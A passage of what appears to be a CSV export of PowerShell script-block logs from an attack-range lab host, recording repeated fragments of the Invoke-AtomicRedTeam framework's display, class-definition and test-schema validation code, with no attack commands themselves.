        Write-KeyValue ""Command:`n"" $test.executor.cleanup_command.trim()
        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }
    }

    # Dependencies
    if ($nul -ne $test.dependencies) {
        Write-Host -ForegroundColor Yellow ""`nDependencies:""
        foreach ($dep in $test.dependencies) {
            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder
            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
            Write-KeyValue ""Description: "" $description.trim()
            Write-KeyValue ""Check Prereq Command:`n"" $dep.prereq_command.trim()
            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue ""Check Prereq Command (with inputs):`n"" $final_command_prereq.trim() }
            Write-KeyValue ""Get Prereq Command:`n"" $dep.get_prereq_command.trim()
            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue ""Get Prereq Command (with inputs):`n"" $final_command_get_prereq.trim() }
        }
    }
    # Footer
    Write-Host -ForegroundColor Magenta ""[!!!!!!!!END TEST!!!!!!!]`n`n""

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710933","0","","","591","function Write-PrereqResults ($FailureReasons, $testId) {
    if ($FailureReasons.Count -eq 0) {
        Write-KeyValue ""Prerequisites met: "" $testId
    }
    else {
        Write-Host -ForegroundColor Red ""Prerequisites not met: $testId""
        foreach ($reason in $FailureReasons) {
            Write-Host -ForegroundColor Yellow -NoNewline ""`t[*] $reason""
        }
        Write-Host -ForegroundColor Yellow -NoNewline ""`nTry installing prereq's with the ""
        Write-Host -ForegroundColor Cyan -NoNewline ""-GetPrereqs""
        Write-Host -ForegroundColor Yellow  "" switch""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710930","0","","","392","function Write-KeyValue ($key, $value) {
    Write-Host -ForegroundColor Cyan -NoNewline $key
    $split = $value -split ""(#{[a-z-_A-Z]*})""
    foreach ($s in $split) {
        if ($s -match ""(#{[a-z-_A-Z]*})"") {
            Write-Host -ForegroundColor Red -NoNewline $s
        }
        else {
            Write-Host -ForegroundColor Green -NoNewline $s
        }
    }
    Write-Host """"
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711032","0","","","1266","class AtomicDependency {
    [String] $description
    [String] $prereq_command
    [String] $get_prereq_command
}

class AtomicInputArgument {
    [String] $description
    [String] $type
    [String] $default
}

class AtomicExecutorBase {
    [String] $name
    [Bool] $elevation_required

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.Name
    }
}

class AtomicExecutorDefault : AtomicExecutorBase {
    [String] $command
    [String] $cleanup_command
}

class AtomicExecutorManual : AtomicExecutorBase {
    [String] $steps
    [String] $cleanup_command
}

class AtomicTest {
    [String] $name
    [String] $auto_generated_guid
    [String] $description
    [String[]] $supported_platforms
    # I wish this didn't have to be a hashtable but I don't
    # want to change the schema and introduce a breaking change.
    [Hashtable] $input_arguments
    [String] $dependency_executor_name
    [AtomicDependency[]] $dependencies
    [AtomicExecutorBase] $executor

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.name
    }
}

class AtomicTechnique {
    [String[]] $attack_technique
    [String] $display_name
    [AtomicTest[]] $atomic_tests
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710927","0","","","3119","function Invoke-CleanupDescription() {
    $ret1 = $test.description.ToString().trim() -replace '(?<!\n)\n(?!\n)', ' ' #replace single linefeeds with a space
    $ret1 -replace '\n\n', ""`n"" #replace double linefeeds with a single linefeed
}
function Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {
    # Header info
    $tName = $technique.display_name.ToString() + "" "" + $technique.attack_technique
    Write-Host -ForegroundColor Magenta ""[********BEGIN TEST*******]""
    Write-KeyValue ""Technique: ""  $tName
    Write-KeyValue ""Atomic Test Name: "" $test.name.ToString()
    Write-KeyValue ""Atomic Test Number: "" $testCount
    if ($test.auto_generated_guid) { Write-KeyValue ""Atomic Test GUID: "" $test.auto_generated_guid }
    Write-KeyValue ""Description: "" $(Invoke-CleanupDescription $test)

    # Attack Commands
    Write-Host -ForegroundColor Yellow ""`nAttack Commands:""
    $elevationRequired = $false
    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }
    $executor_name = $test.executor.name
    Write-KeyValue ""Executor: "" $executor_name
    Write-KeyValue ""ElevationRequired: "" $elevationRequired
    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder
    Write-KeyValue ""Command:`n"" $test.executor.command.trim()
    if ($test.executor.command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }

    # Cleanup Commands
    if ($nul -ne $test.executor.cleanup_command) {
        Write-Host -ForegroundColor Yellow ""`nCleanup Commands:""
        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder
        Write-KeyValue ""Command:`n"" $test.executor.cleanup_command.trim()
        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }
    }

    # Dependencies
    if ($nul -ne $test.dependencies) {
        Write-Host -ForegroundColor Yellow ""`nDependencies:""
        foreach ($dep in $test.dependencies) {
            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder
            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
            Write-KeyValue ""Description: "" $description.trim()
            Write-KeyValue ""Check Prereq Command:`n"" $dep.prereq_command.trim()
            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue ""Check Prereq Command (with inputs):`n"" $final_command_prereq.trim() }
            Write-KeyValue ""Get Prereq Command:`n"" $dep.get_prereq_command.trim()
            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue ""Get Prereq Command (with inputs):`n"" $final_command_get_prereq.trim() }
        }
    }
    # Footer
    Write-Host -ForegroundColor Magenta ""[!!!!!!!!END TEST!!!!!!!]`n`n""

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:45 PM","35709042","0","","","16","{ Test-Path $_ }","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711057","0","","","10667","ingsWithPotentialInputArgs.Add($Dependency['prereq_command'])

                    if (-not $Dependency.ContainsKey('get_prereq_command')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element is required.""
                        return
                    }

                    if (-not ($Dependency['get_prereq_command'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependencies[$j].get_prereq_command' element must be a string.""
                        return
                    }

                    $DependencyInstance.get_prereq_command = $Dependency['get_prereq_command']
                    $StringsWithPotentialInputArgs.Add($Dependency['get_prereq_command'])

                    $Dependencies[$j] = $DependencyInstance

                    $j++
                }

                $AtomicTestInstance.dependencies = $Dependencies
            }

            if ($AtomicTest.ContainsKey('dependency_executor_name')) {
                if ($ValidExecutorTypes -notcontains $AtomicTest['dependency_executor_name']) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].dependency_executor_name': '$($AtomicTest['dependency_executor_name'])' must be one of the following: $($ValidExecutorTypes -join ', ').""
                    return
                }

                if ($null -eq $AtomicTestInstance.Dependencies) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] If 'atomic_tests[$i].dependency_executor_name' is defined, there must be at least one dependency defined.""
                }

                $AtomicTestInstance.dependency_executor_name = $AtomicTest['dependency_executor_name']
            }

            $InputArguments = $null

            # input_arguments is optional
            if ($AtomicTest.ContainsKey('input_arguments')) {
                if (-not ($AtomicTest['input_arguments'] -is [Hashtable])) {
                    $AtomicTest['input_arguments'].GetType().FullName
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must be a hashtable.""
                    return
                }

                if (-not ($AtomicTest['input_arguments'].Count)) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments' must have at least one entry.""
                    return
                }

                $InputArguments = @{}

                $j = 0

                foreach ($InputArgName in $AtomicTest['input_arguments'].Keys) {

                    $InputArgument = [AtomicInputArgument]::new()

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('description')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element is required.""
                        return
                    }

                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.""
                        return
                    }

                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.""
                        return
                    }

                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')""
                    }

                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.""
                        return
                    }

                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']

                    $InputArguments[$InputArgName] = $InputArgument

                    $j++
                }
            }

            $AtomicTestInstance.input_arguments = $InputArguments

            if (-not $AtomicTest.ContainsKey('executor')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.""
                return
            }

            if (-not ($AtomicTest['executor'] -is [Hashtable])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.""
                return
            }

            if (-not $AtomicTest['executor'].ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.""
                return
            }

            if (-not ($AtomicTest['executor']['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.""
                return
            }

            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.""
                return
            }

            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')""
                return
            }

            if ($AtomicTest['executor']['name'] -eq 'manual') {
                if (-not $AtomicTest['executor'].ContainsKey('steps')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.""
                    return
                }

                if (-not ($AtomicTest['executor']['steps'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorManual]::new()
                $ExecutorInstance.steps = $AtomicTest['executor']['steps']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])
            }
            else {
                if (-not $AtomicTest['executor'].ContainsKey('command')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.""
                    return
                }

                if (-not ($AtomicTest['executor']['command'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorDefault]::new()
                $ExecutorInstance.command = $AtomicTest['executor']['command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])
            }

            # cleanup_command element is optional
            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {
                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])
            }

            # elevation_required element is optional
            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {
                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.""
                    return
                }

                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']
            }
            else {
                # if elevation_required is not present, default to false
                $ExecutorInstance.elevation_required = $False
            }

            $InputArgumentNames = $null

            # Get all input argument names
            $InputArgumentNames = $InputArguments.Keys

            # Extract all input arguments names from the executor
            # Potential places where input arguments can be populated:
            #  - Dependency description
            #  - Dependency prereq_command
            #  - Dependency get_prereq_command
            #  - Executor steps
            #  - Executor command
            #  - Executor cleanup_command

            $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
            ForEach-Object { $Regex.Matches($_) } |
            Select-Object -ExpandProperty Groups |
            Where-Object { $_.Name -eq 'ArgName' } |
            Select-Object -ExpandProperty Value |
            Sort-Object -Unique


            # Validate ","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","3",""
"12/16/2024 8:34:55 PM","35710736","0","","","3119","function Invoke-CleanupDescription() {
    $ret1 = $test.description.ToString().trim() -replace '(?<!\n)\n(?!\n)', ' ' #replace single linefeeds with a space
    $ret1 -replace '\n\n', ""`n"" #replace double linefeeds with a single linefeed
}
function Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {
    # Header info
    $tName = $technique.display_name.ToString() + "" "" + $technique.attack_technique
    Write-Host -ForegroundColor Magenta ""[********BEGIN TEST*******]""
    Write-KeyValue ""Technique: ""  $tName
    Write-KeyValue ""Atomic Test Name: "" $test.name.ToString()
    Write-KeyValue ""Atomic Test Number: "" $testCount
    if ($test.auto_generated_guid) { Write-KeyValue ""Atomic Test GUID: "" $test.auto_generated_guid }
    Write-KeyValue ""Description: "" $(Invoke-CleanupDescription $test)

    # Attack Commands
    Write-Host -ForegroundColor Yellow ""`nAttack Commands:""
    $elevationRequired = $false
    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }
    $executor_name = $test.executor.name
    Write-KeyValue ""Executor: "" $executor_name
    Write-KeyValue ""ElevationRequired: "" $elevationRequired
    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder
    Write-KeyValue ""Command:`n"" $test.executor.command.trim()
    if ($test.executor.command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }

    # Cleanup Commands
    if ($nul -ne $test.executor.cleanup_command) {
        Write-Host -ForegroundColor Yellow ""`nCleanup Commands:""
        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder
        Write-KeyValue ""Command:`n"" $test.executor.cleanup_command.trim()
        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }
    }

    # Dependencies
    if ($nul -ne $test.dependencies) {
        Write-Host -ForegroundColor Yellow ""`nDependencies:""
        foreach ($dep in $test.dependencies) {
            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder
            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
            Write-KeyValue ""Description: "" $description.trim()
            Write-KeyValue ""Check Prereq Command:`n"" $dep.prereq_command.trim()
            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue ""Check Prereq Command (with inputs):`n"" $final_command_prereq.trim() }
            Write-KeyValue ""Get Prereq Command:`n"" $dep.get_prereq_command.trim()
            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue ""Get Prereq Command (with inputs):`n"" $final_command_get_prereq.trim() }
        }
    }
    # Footer
    Write-Host -ForegroundColor Magenta ""[!!!!!!!!END TEST!!!!!!!]`n`n""

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710739","0","","","392","function Write-KeyValue ($key, $value) {
    Write-Host -ForegroundColor Cyan -NoNewline $key
    $split = $value -split ""(#{[a-z-_A-Z]*})""
    foreach ($s in $split) {
        if ($s -match ""(#{[a-z-_A-Z]*})"") {
            Write-Host -ForegroundColor Red -NoNewline $s
        }
        else {
            Write-Host -ForegroundColor Green -NoNewline $s
        }
    }
    Write-Host """"
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710742","0","","","591","function Write-PrereqResults ($FailureReasons, $testId) {
    if ($FailureReasons.Count -eq 0) {
        Write-KeyValue ""Prerequisites met: "" $testId
    }
    else {
        Write-Host -ForegroundColor Red ""Prerequisites not met: $testId""
        foreach ($reason in $FailureReasons) {
            Write-Host -ForegroundColor Yellow -NoNewline ""`t[*] $reason""
        }
        Write-Host -ForegroundColor Yellow -NoNewline ""`nTry installing prereq's with the ""
        Write-Host -ForegroundColor Cyan -NoNewline ""-GetPrereqs""
        Write-Host -ForegroundColor Yellow  "" switch""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710751","0","","","9","$global:?","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710756","0","","","9","$global:?","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710810","0","","","58",". 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710515","0","","","1266","class AtomicDependency {
    [String] $description
    [String] $prereq_command
    [String] $get_prereq_command
}

class AtomicInputArgument {
    [String] $description
    [String] $type
    [String] $default
}

class AtomicExecutorBase {
    [String] $name
    [Bool] $elevation_required

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.Name
    }
}

class AtomicExecutorDefault : AtomicExecutorBase {
    [String] $command
    [String] $cleanup_command
}

class AtomicExecutorManual : AtomicExecutorBase {
    [String] $steps
    [String] $cleanup_command
}

class AtomicTest {
    [String] $name
    [String] $auto_generated_guid
    [String] $description
    [String[]] $supported_platforms
    # I wish this didn't have to be a hashtable but I don't
    # want to change the schema and introduce a breaking change.
    [Hashtable] $input_arguments
    [String] $dependency_executor_name
    [AtomicDependency[]] $dependencies
    [AtomicExecutorBase] $executor

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.name
    }
}

class AtomicTechnique {
    [String[]] $attack_technique
    [String] $display_name
    [AtomicTest[]] $atomic_tests
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710496","0","","","650","function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:59 PM","35711189","0","","","6","prompt","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
